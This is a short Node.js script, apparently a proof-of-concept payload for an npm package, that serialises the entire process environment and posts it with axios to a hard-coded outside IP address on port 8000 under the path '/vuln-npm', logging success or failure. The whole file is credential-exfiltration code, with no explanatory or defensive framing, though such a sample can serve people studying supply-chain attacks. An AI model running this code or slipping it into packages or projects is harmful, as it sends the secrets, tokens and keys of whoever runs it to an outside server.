const axios = require('axios');

const server = '143.47.191.81'; 
const port = 8000;

const main =  () => {
	console.log('[.] Starting request...');
	axios.post(
			`http:/${server}:${port}/vuln-npm`,
			JSON.stringify(process.env, null, 4)
	).then( res => {
		console.log('[+] Success!');
	})
	.catch( err => {
		console.log('[!] Error!')
	});
}

main();
